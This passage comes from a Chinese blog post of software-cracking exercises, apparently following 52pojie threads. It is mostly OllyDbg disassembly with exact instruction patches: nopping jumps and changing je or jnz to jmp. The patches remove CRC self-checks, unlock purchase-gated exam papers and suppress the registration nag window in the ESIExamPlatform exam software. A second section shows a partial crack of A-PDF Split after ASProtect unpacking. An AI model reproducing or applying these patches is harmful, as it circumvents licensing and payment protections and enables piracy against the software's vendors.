class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">004015DF     /74 22         je short ESPlatfo.00401603;nop掉</span><br><span class="line">004015E1     |8B4424 20     mov eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8</span><br><span class="line">004015E5     |8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0</span><br><span class="line">004015E9     |7C 18         jl short ESPlatfo.00401603;nop掉</span><br><span class="line">004015EB     |51            push ecx</span><br><span class="line">004015EC     |50            push eax</span><br><span class="line">004015ED     |E8 727F0200   call ESPlatfo.00429564</span><br><span class="line">004015F2     |83C4 08       add esp,0x8</span><br><span class="line">004015F5     |85C0          test eax,eax</span><br><span class="line">004015F7     |74 0A         je short ESPlatfo.00401603;nop掉</span><br><span class="line">004015F9     |2B4424 20     sub eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8</span><br><span class="line">004015FD     |D1F8          sar eax,1</span><br><span class="line">004015FF     |3BC6          cmp eax,esi</span><br><span class="line">00401601     |75 3E         jnz short ESPlatfo.00401641;改为jmp</span><br><span class="line">00401603     \6A 00         push 0x0</span><br><span class="line">00401605      6A 00         push 0x0</span><br><span class="line">00401607      68 00934400   push ESPlatfo.00449300                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！</span><br><span class="line">0040160C  |.  E8 2FCD0000   call ESPlatfo.0040E340</span><br></pre></td></tr></table></figure><p>此时单独运行<code>ESIExamPlatform.exe</code>会出现异常。</p><img src="/posts/f398dcca/4.7.1.png" class="" title="应用程序发生异常"><p>再次载入OD，找到<code>4757CA</code>，在<code>4757C5</code>下断，进入函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2</span><br><span class="line">004757CA  |.  83C4 14       add esp,0x14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00474C56  |.  FF15 44B34900 call dword ptr ds:[&lt;&amp;kernel32.#IsSystemResum&gt;; [IsDebuggerPresent</span><br><span class="line">00474C5C  |.  6A 00         push 0x0                                     ; /pTopLevelFilter = NULL</span><br><span class="line">00474C5E  |.  8BD8          mov ebx,eax                                  ; |</span><br><span class="line">00474C60  |.  FF15 48B14900 call dword ptr ds:[&lt;&amp;kernel32.#SetVolumeMoun&gt;; \SetUnhandledExceptionFilter</span><br><span class="line">00474C66  |.  8D85 28FDFFFF lea eax,[local.182]</span><br><span class="line">00474C6C  |.  50            push eax                                     ; /pExceptionInfo = 00124C88</span><br><span class="line">00474C6D  |.  FF15 44B14900 call dword ptr ds:[&lt;&amp;kernel32.#UnregisterWai&gt;; \UnhandledExceptionFilter</span><br></pre></td></tr></table></figure><p>程序运行到<code>UnhandledExceptionFilter</code>处出错。因为这个函数前面没有跳转指令，所以要返回到父函数寻找跳转指令绕过这个子函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">004757AD  |. /74 07         je short ESIExamP.004757B6;绕过循环跳转就必须jmp,但同时异常也会被执行</span><br><span class="line">004757AF  |. |8B5D 0C       mov ebx,[arg.2]</span><br><span class="line">004757B2  |. |3BDF          cmp ebx,edi</span><br><span class="line">004757B4  |. |77 1E         ja short ESIExamP.004757D4;这个跳转实现虽然绕过异常，但一直在循环，直到不循环时也是要执行异常</span><br><span class="line">004757B6  |&gt; \E8 BB2D0000   call ESIExamP.00478576</span><br><span class="line">004757BB  |.  6A 16         push 0x16</span><br><span class="line">004757BD  |.  5E            pop esi                                      ;  ESIExamP.0047BEE6</span><br><span class="line">004757BE  |.  8930          mov dword ptr ds:[eax],esi</span><br><span class="line">004757C0  |&gt;  57            push edi;这个跳过来的是个jmp指令，没办法不执行，改nop也不行</span><br><span class="line">004757C1  |.  57            push edi</span><br><span class="line">004757C2  |.  57            push edi</span><br><span class="line">004757C3  |.  57            push edi</span><br><span class="line">004757C4  |.  57            push edi</span><br><span class="line">004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2;异常函数</span><br></pre></td></tr></table></figure><p>所以这两个跳转无论如何都不能够使这个异常不实现，继续找父函数。在堆栈窗口找到返回地址跟随。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00124F84  |0041B9E7  返回到 ESIExamP.0041B9E7 来自 ESIExamP.0047579E</span><br></pre></td></tr></table></figure><p>发现可以利用<code>0041B9D4</code>的跳转指令绕过异常函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0041B9D4  |. /74 14         je short ESIExamP.0041B9EA;改为jmp</span><br><span class="line">0041B9D6  |. |68 84744A00   push ESIExamP.004A7484                       ;  s</span><br><span class="line">0041B9DB  |. |6A 01         push 0x1</span><br><span class="line">0041B9DD  |. |68 FFFFFF00   push 0xFFFFFF</span><br><span class="line">0041B9E2  |. |E8 B79D0500   call ESIExamP.0047579E;异常函数</span><br><span class="line">0041B9E7  |. |83C4 0C       add esp,0xC</span><br><span class="line">0041B9EA  |&gt; \8D8C24 900000&gt;lea ecx,dword ptr ss:[esp+0x90]</span><br></pre></td></tr></table></figure><p>发现单独运行它又弹出一连串的“CRC校验失败，请重新下载本软件”的对话框。搜索字符串，在函数开头下断运行，发现<code>0043DB14</code>能绕过弹窗，<code>0043DB94</code>不能，因为je指令会绕过jnz指令。所以要在<code>0043DB14</code>改为jmp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0043DB14  |. /0F84 C0000000 je ESIExamP.0043DBDA;改为jmp</span><br><span class="line">...</span><br><span class="line">0043DB89  |. /74 0B         je short ESIExamP.0043DB96</span><br><span class="line">0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]</span><br><span class="line">0043DB8F  |. |D1F8          sar eax,1</span><br><span class="line">0043DB91  |. |83F8 FF       cmp eax,-0x1</span><br><span class="line">0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0</span><br><span class="line">0043DB96  |&gt; \6A 00         push 0x0</span><br><span class="line">0043DB98  |.  6A 00         push 0x0</span><br><span class="line">0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!</span><br><span class="line">0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>但这样改就会跳转到“程序不完整”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0043DBDA  |&gt; \8B4E 20       mov ecx,dword ptr ds:[esi+0x20]</span><br><span class="line">0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)</span><br><span class="line">0043DBDF  |.  51            push ecx                                 ; |hWnd = 494F6396</span><br><span class="line">0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[&lt;&amp;user32.#435&gt;]       ; \KillTimer</span><br><span class="line">0043DBE6  |.  6A 00         push 0x0</span><br><span class="line">0043DBE8  |.  6A 00         push 0x0</span><br><span class="line">0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!</span><br><span class="line">0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>重新修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">0043DB77  |. /7C 1D         jl short ESIExamP.0043DB96;nop掉</span><br><span class="line">0043DB79  |. |68 206D4A00   push ESIExamP.004A6D20                   ;  495</span><br><span class="line">0043DB7E  |. |50            push eax</span><br><span class="line">0043DB7F  |. |E8 DE660300   call ESIExamP.00474262</span><br><span class="line">0043DB84  |. |83C4 08       add esp,0x8</span><br><span class="line">0043DB87  |. |85C0          test eax,eax</span><br><span class="line">0043DB89  |. |74 0B         je short ESIExamP.0043DB96;nop掉</span><br><span class="line">0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]</span><br><span class="line">0043DB8F  |. |D1F8          sar eax,1</span><br><span class="line">0043DB91  |. |83F8 FF       cmp eax,-0x1</span><br><span class="line">0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0;修改为jmp</span><br><span class="line">0043DB96  |&gt; \6A 00         push 0x0</span><br><span class="line">0043DB98  |.  6A 00         push 0x0</span><br><span class="line">0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!</span><br><span class="line">0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF</span><br><span class="line">0043DBA4  |.  8B16          mov edx,dword ptr ds:[esi]               ;  ESIExamP.004AF6BC</span><br><span class="line">0043DBA6  |.  8B82 5C010000 mov eax,dword ptr ds:[edx+0x15C]</span><br><span class="line">0043DBAC  |.  8BCE          mov ecx,esi</span><br><span class="line">0043DBAE  |.  FFD0          call eax</span><br><span class="line">0043DBB0  |&gt;  C68424 880000&gt;mov byte ptr ss:[esp+0x88],0x2</span><br><span class="line">0043DBB8  |.  8B4424 14     mov eax,dword ptr ss:[esp+0x14]</span><br><span class="line">0043DBBC  |.  83C0 F0       add eax,-0x10</span><br><span class="line">0043DBBF  |.  8D48 0C       lea ecx,dword ptr ds:[eax+0xC]</span><br><span class="line">0043DBC2  |.  83CA FF       or edx,-0x1</span><br><span class="line">0043DBC5  |.  f0:0fc111     lock xadd dword ptr ds:[ecx],edx</span><br><span class="line">0043DBC9  |.  4A            dec edx</span><br><span class="line">0043DBCA  |.  85D2          test edx,edx</span><br><span class="line">0043DBCC  |.  7F 3D         jg short ESIExamP.0043DC0B;修不修改终将会绕过“程序不完整”弹窗</span><br><span class="line">0043DBCE  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  ESIExamP.004C8790</span><br><span class="line">0043DBD0  |.  8B11          mov edx,dword ptr ds:[ecx]</span><br><span class="line">0043DBD2  |.  50            push eax</span><br><span class="line">0043DBD3  |.  8B42 04       mov eax,dword ptr ds:[edx+0x4]</span><br><span class="line">0043DBD6  |.  FFD0          call eax</span><br><span class="line">0043DBD8  |.  EB 31         jmp short ESIExamP.0043DC0B</span><br><span class="line">0043DBDA  |&gt;  8B4E 20       mov ecx,dword ptr ds:[esi+0x20]</span><br><span class="line">0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)</span><br><span class="line">0043DBDF  |.  51            push ecx                                 ; |hWnd = 00B1AF3C</span><br><span class="line">0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[&lt;&amp;user32.#435&gt;]       ; \KillTimer</span><br><span class="line">0043DBE6  |.  6A 00         push 0x0</span><br><span class="line">0043DBE8  |.  6A 00         push 0x0</span><br><span class="line">0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!</span><br><span class="line">0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>运行<code>ESPlatform.exe</code>可以正常启动<code>ESIExamPlatform.exe</code>出现主程序，单独启动<code>ESIExamPlatform.exe</code>也可出现主程序。至此，CRC校验全被清除。</p><p>在主程序点击一下功能看程序是否能正常工作。发现在点击“答题记录”或“统计曲线”或“习题集”时出现错误提示框，然后直接退出程序。</p><img src="/posts/f398dcca/4.7.3.png" class="" title="浮点数错误"><p>这是因为代码调用了浮点数，而程序在启动时因为缺省没有调用初始化浮点数的函数。程序启动阶段<code>___tmainCRTStartup</code>函数中调用了<code>__cinit</code>函数，在这个函数的第一个判断是校验浮点运算初始化函数指针所处的section是否为可写，如果可写的话就跳过浮点运算初始化函数，因此缺省情况下会直接显示出错信息并退出，如果该区段不可写，代码会调用浮点运算初始化函数，缺省的指向出错函数的指针会被替换成正常处理函数，因此可以正常运算。</p><p>又因为它会退出程序，Ctrl+G搜索<code>ExitProcess</code>下断，按下“统计曲线”-&gt;确定，程序停在断点处。在堆栈窗口返回到父函数。不断堆栈回溯再跟进来到这，看到下面有个<code>WriteFile</code>函数，说明<code>.MPRESS1</code>区段可写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0047BC3C  |&gt; \68 10200100   push 0x12010</span><br><span class="line">0047BC41  |.  68 60174A00   push ESIExamP.004A1760                                   ;  Microsoft Visual C++ Runtime Library</span><br><span class="line">0047BC46  |.  57            push edi</span><br><span class="line">0047BC47  |.  E8 A4EF0000   call ESIExamP.0048ABF0                                   ;  错误函数</span><br><span class="line">0047BC4C  |.  83C4 0C       add esp,0xC</span><br><span class="line">0047BC4F  |.  EB 32         jmp short ESIExamP.0047BC83</span><br><span class="line">0047BC51  |&gt;  6A F4         push -0xC                                                ; /DevType = STD_ERROR_HANDLE</span><br><span class="line">0047BC53  |.  FF15 80B14900 call dword ptr ds:[&lt;&amp;kernel32.#GetStringTypeExA_433&gt;]    ; \GetStdHandle</span><br><span class="line">0047BC59  |.  8BD8          mov ebx,eax</span><br><span class="line">0047BC5B  |.  3BDE          cmp ebx,esi</span><br><span class="line">0047BC5D  |.  74 24         je short ESIExamP.0047BC83</span><br><span class="line">0047BC5F  |.  83FB FF       cmp ebx,-0x1</span><br><span class="line">0047BC62  |.  74 1F         je short ESIExamP.0047BC83</span><br><span class="line">0047BC64  |.  6A 00         push 0x0</span><br><span class="line">0047BC66  |.  8D45 F8       lea eax,[local.2]</span><br><span class="line">0047BC69  |.  50            push eax</span><br><span class="line">0047BC6A  |.  8D34FD 246B4C&gt;lea esi,dword ptr ds:[edi*8+0x4C6B24]                    ;  R6002\r\n- floating point support not loaded\r\n</span><br><span class="line">0047BC71  |.  FF36          push dword ptr ds:[esi]</span><br><span class="line">0047BC73  |.  E8 982A0000   call ESIExamP.0047E710</span><br><span class="line">0047BC78  |.  59            pop ecx                                                  ; |ESIExamP.004754A8</span><br><span class="line">0047BC79  |.  50            push eax                                                 ; |nBytesToWrite = 0x0</span><br><span class="line">0047BC7A  |.  FF36          push dword ptr ds:[esi]                                  ; |Buffer = NULL</span><br><span class="line">0047BC7C  |.  53            push ebx                                                 ; |hFile = 00124EFC</span><br><span class="line">0047BC7D  |.  FF15 4CB34900 call dword ptr ds:[&lt;&amp;kernel32.#WritePrivateProfileString&gt;; \WriteFile</span><br><span class="line">0047BC83  |&gt;  5F            pop edi                                                  ;  ESIExamP.004754A8</span><br><span class="line">0047BC84  |.  5E            pop esi                                                  ;  ESIExamP.004754A8</span><br><span class="line">0047BC85  |.  5B            pop ebx                                                  ;  ESIExamP.004754A8</span><br><span class="line">0047BC86  |.  C9            leave</span><br><span class="line">0047BC87  \.  C3            retn</span><br></pre></td></tr></table></figure><p>将<code>.MPRESS1</code>区段改为不可写显然不现实，因为程序不止这一处是写入的，那就只能强制初始化。载入IDA查看<code>__cinit</code>函数，发现它有<code>__IsNonwritableInCurrentImage</code>函数，用来判断地址是否可写，不能写则调用<code>__fpmath</code>(call off_4A11A8)进行初始化。 </p><img src="/posts/f398dcca/4.7.4.png" class="" title="浮点数错误"><p>回到OD修改<code>475561</code>和<code>475570</code>地址的<code>jz</code>指令改为<code>nop</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00475561     /74 19         je short ESIExamP.0047557C;nop掉</span><br><span class="line">00475570     /74 0A         je short ESIExamP.0047557C;nop掉</span><br></pre></td></tr></table></figure><p>习题集、统计曲线等等都可以正常打开了。</p><p>接着爆破。最终目的是能bp试卷，所以找到两处购买试题的地方，可知标志位保存在<code>ebx+0x15C</code>中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0043032E   &gt; \83BB 5C010000&gt;cmp dword ptr ds:[ebx+0x15C],0x0</span><br><span class="line">00430335   .  0F85 A5000000 jnz ESIExamP.004303E0</span><br><span class="line">0043033B   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]</span><br><span class="line">00430341   .  51            push ecx</span><br><span class="line">00430342   .  8D95 B0F8FFFF lea edx,dword ptr ss:[ebp-0x750]</span><br><span class="line">00430348   .  68 78CB4A00   push ESIExamP.004ACB78                   ;  &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=</span><br><span class="line">0043034D   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet</span><br><span class="line">0043034E   .  E8 3D56FDFF   call ESIExamP.00405990</span><br><span class="line">00430353   .  83C4 0C       add esp,0xC</span><br><span class="line">00430356   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  &gt;&lt;font color=red&gt;未购买该试题 点击购买&lt;/font&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00430B14   .  83BB 5C010000&gt;cmp dword ptr ds:[ebx+0x15C],0x0</span><br><span class="line">00430B1B   .  0F85 9C000000 jnz ESIExamP.00430BBD</span><br><span class="line">00430B21   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]</span><br><span class="line">00430B27   .  51            push ecx</span><br><span class="line">00430B28   .  8D95 90F8FFFF lea edx,dword ptr ss:[ebp-0x770]</span><br><span class="line">00430B2E   .  68 C4CC4A00   push ESIExamP.004ACCC4                   ;  &lt;a href=</span><br><span class="line">00430B33   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet</span><br><span class="line">00430B34   .  E8 574EFDFF   call ESIExamP.00405990</span><br><span class="line">00430B39   .  83C4 0C       add esp,0xC</span><br><span class="line">00430B3C   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  &gt;&lt;font color=red&gt;未购买该试题 点击购买&lt;/font&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>修改方法有两种：</p><ol><li>查找参考-&gt;地址常量，找到所有<code>cmp dword ptr ds:[ecx+0x15C],0x0</code>，修改其下面的跳转指令；</li><li>查找参考-&gt;地址常量，找到所有给[ebx+0x15C]赋值的地方，修改其赋值。</li></ol><p>选择哪一个比较好视工作量而定，肯定是哪个修改量少修改哪个。</p><p>我觉得在这程序里第一种方法工作量比较小。修改完后已经没有“购买试题”的字样了，但NAG窗口还在。搜索字符串先将这里修改了，试题我都bp了，怎么能说我没注册呢！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0043E6A2     /74 66         je short ESIExamP.0043E70A               ;  nop掉</span><br><span class="line">0043E6A4   . |68 8CF04A00   push ESIExamP.004AF08C                   ;  您已获得本套系统正版授权，谢谢您的支持！</span><br><span class="line">0043E6A9   . |68 24040000   push 0x424</span><br><span class="line">0043E6AE   . |8BCD          mov ecx,ebp</span><br><span class="line">0043E6B0   . |E8 A2270100   call ESIExamP.00450E57</span><br><span class="line">0043E6B5   . |8BC8          mov ecx,eax</span><br><span class="line">0043E6B7   . |E8 DB280100   call ESIExamP.00450F97</span><br><span class="line">0043E6BC   . |68 B8F04A00   push ESIExamP.004AF0B8                   ;  系统已经注册</span><br><span class="line">0043E6C1   . |6A 01         push 0x1</span><br></pre></td></tr></table></figure><p>接着去掉NAG窗口。在命令窗口下断<code>bp CreateDialogIndirectParamW</code>(CreateDialogIndirectParam是用于从内存中的对话框模板上创建一个无模式对话框的函数)。第一次F9运行至断点处，第二次F9出现主程序，第三次F9出现NAG。所以要在第二次F9到第三次F9之间找到绕过NAG窗口的指令。</p><p>在第二次F9后，一路F8，运行到这一句时弹出NAG窗口。(这里前面有个可以绕过<code>call</code>指令的跳转指令，但是不能将它改为<code>jmp</code>，因为你会发现这个<code>call</code>指令被运行了两次，第一次是主程序，第二次才是NAG)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00452936     /74 1E         je short ESIExamP.00452956</span><br><span class="line">00452938   . |6A 04         push 0x4</span><br><span class="line">0045293A   . |5F            pop edi</span><br><span class="line">0045293B   . |8BCE          mov ecx,esi</span><br><span class="line">0045293D   . |E8 C9E5FFFF   call ESIExamP.00450F0B</span><br><span class="line">00452942   . |A9 00010000   test eax,0x100</span><br><span class="line">00452947   . |74 03         je short ESIExamP.0045294C</span><br><span class="line">00452949   . |6A 05         push 0x5</span><br><span class="line">0045294B   . |5F            pop edi</span><br><span class="line">0045294C   &gt; |57            push edi</span><br><span class="line">0045294D   . |8BCE          mov ecx,esi</span><br><span class="line">0045294F   . |E8 B8270000   call ESIExamP.0045510C                   ;  第一次主程序，第二次NAG窗口</span><br><span class="line">00452954   . |33FF          xor edi,edi</span><br><span class="line">00452956   &gt; \397E 20       cmp dword ptr ds:[esi+0x20],edi     </span><br></pre></td></tr></table></figure><p>在堆栈窗口找到这句反汇编窗口跟随。(主程序与NAG“返回到”的地址不同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00124ED0   0043835E  返回到 ESIExamP.0043835E 来自 ESIExamP.00452827</span><br></pre></td></tr></table></figure><p>将<code>jnz</code>修改为<code>jmp</code>指令绕过NAG窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00438341   . /75 2A         jnz short ESIExamP.0043836D;jmp</span><br><span class="line">00438343   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]</span><br><span class="line">00438349   . |51            push ecx</span><br><span class="line">0043834A   . |E8 4122FEFF   call ESIExamP.0041A590</span><br><span class="line">0043834F   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]</span><br><span class="line">00438355   . |C645 FC 27    mov byte ptr ss:[ebp-0x4],0x27</span><br><span class="line">00438359   . |E8 C9A40100   call ESIExamP.00452827                                ;  NAG</span><br><span class="line">0043835E   . |8D95 E4F9FFFF lea edx,dword ptr ss:[ebp-0x61C]</span><br><span class="line">00438364   . |52            push edx</span><br><span class="line">00438365   . |885D FC       mov byte ptr ss:[ebp-0x4],bl</span><br><span class="line">00438368   . |E8 2323FEFF   call ESIExamP.0041A690</span><br><span class="line">0043836D   &gt; \8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</span><br></pre></td></tr></table></figure><h2 id="第八战：A-PDF-Split-已下载"><a href="#第八战：A-PDF-Split-已下载" class="headerlink" title="第八战：A-PDF Split(已下载)"></a>第八战：A-PDF Split(已下载)</h2><p><a href="https://www.52pojie.cn/thread-199834-1-1.html">https://www.52pojie.cn/thread-199834-1-1.html</a></p><p>ASProtect1.23 RC1+14处自校验+跳转爆破</p><p>发现不会手脱，那就用脱壳工具中的ASProtect Unpacker 汉化版脱壳。是用Delphi写的程序。</p><p>载入OD，下<code>bp MessageBoxA</code>和<code>bp MessageBoxW</code>断点，运行，点击试用卡在了kernel32模块的某个地方。F8走出来，回到用户代码处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040B285      E8 8692FFFF   call PdfSplit.00404510</span><br><span class="line">0040B28A  |.  5F            pop edi                                            ;  PdfSplit.0040B28A</span><br><span class="line">0040B28B  |.  5E            pop esi                                            ;  PdfSplit.0040B28A</span><br></pre></td></tr></table></figure><p>发现应该是<code>40B285</code>地址的call指令产生的错误，直接把它NOP掉。保存，运行发现程序直接退出了。程序退出调用的是<code>PostQuitMessage</code>函数，下这个断点。点击“Try”，程序停在断点处。堆栈查看返回函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0012FD88   0048BDBC  /CALL 到 PostQuitMessage 来自 PdfSplit.0048BDB7</span><br><span class="line">0012FD8C   00000000  \ExitCode = 0x0</span><br><span class="line">0012FD90   00576B5B  返回到 PdfSplit.00576B5B 来自 PdfSplit.0048BDAC</span><br><span class="line">0012FD94   0012FDEC  指向下一个 SEH 记录的指针</span><br><span class="line">0012FD98   0057705E  SE处理程序</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0048BDB3  |. /74 07         je short PdfSplit.0048BDBC;要跳</span><br><span class="line">0048BDB5  |. |6A 00         push 0x0                                 ; /ExitCode = 0x0</span><br><span class="line">0048BDB7  |. |E8 18BDF7FF   call &lt;jmp.&amp;user32.PostQuitMessage&gt;       ; \PostQuitMessage</span><br><span class="line">0048BDBC  \&gt; \C3            retn</span><br></pre></td></tr></table></figure><p><code>je</code>修改为<code>jmp</code>。保存。运行程序发现点击“Try”能进入主程序了，也没有错误框。但点击“Browse”又弹出错误框。</p><img src="/posts/f398dcca/8.2.png" class="" title="弹出错误"><p>点击关闭还关闭不了了。</p><img src="/posts/f398dcca/8.2.png" class="" title="无效指针"><p>…好难，脱壳好像引发别的错误了…</p><h2 id="第九战：XXPDF转WORD助手"><a href="#第九战：XXPDF转WORD助手" class="headerlink" title="第九战：XXPDF转WORD助手"></a>第九战：XXPDF转WORD助手</h2><p><a href="https://www.52pojie.cn/thread-200655-1-1.html">https://www.52pojie.cn/thread-200655-1-1.html</a></p><p>tElock壳+自校验+爆破</p><h2 id="第十战：LanHelper算法分析与注册机的编写"><a href="#第十战：LanHelper算法分析与注册机的编写" class="headerlink" title="第十战：LanHelper算法分析与注册机的编写"></a>第十战：LanHelper算法分析与注册机的编写</h2><p><a href="https://www.52pojie.cn/thread-200798-1-1.html">https://www.52pojie.cn/thread-200798-1-1.html</a></p><p>算法分析</p><img src="/posts/f398dcca/10.1.png" class="" 